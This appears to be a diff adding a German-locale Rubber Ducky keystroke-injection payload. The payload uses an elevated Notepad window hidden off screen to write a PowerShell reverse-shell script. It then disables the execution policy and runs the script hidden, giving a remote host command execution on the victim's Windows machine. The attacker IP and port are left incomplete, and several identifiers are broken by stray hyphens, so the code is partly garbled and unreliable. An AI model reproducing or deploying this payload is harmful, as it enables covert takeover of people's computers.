@@ -1,0 +1,53 @@
+LOCALE DE
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 4000
+ALT j
+DELAY 750
+ENTER
+ALT SPACE
+DELAY 1000
+STRING v
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+REM PowerShell-Skript anlegen, um ReverseShell aufzubauen
+STRING Add-Content "$env:TEMP\58800.ps1" '$c = New-Object Sys-tem.Net.Sockets.TCPClient("192.168.178.",);$s = $c.Get-Stream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEn-coding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + "PS " + (pwd).Path + "> ";$sby = ([text.en-coding]::ASCII).Get-Bytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
+ENTER
+STRING start-Process powershell.exe -windowstyle hidden "$env:TEMP\58800.ps1"
+ENTER
+STRING Remove-Item $MyINvocation.InvocationName
+ENTER
+CTRL s
+DELAY 1500
+STRING C:\Windows\config-33567.ps1
+ENTER
+DELAY 1000
+ALT F4
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 4000
+ALT j
+DELAY 750
+STRING mode con:cols=14 lines=1
+V
+ENTER
+ALT SPACE
+DELAY 1000
+STRING v
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope Curren-tUser -Confirm:$false
+ENTER
+DELAY 750
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-33567.ps1
+ENTER
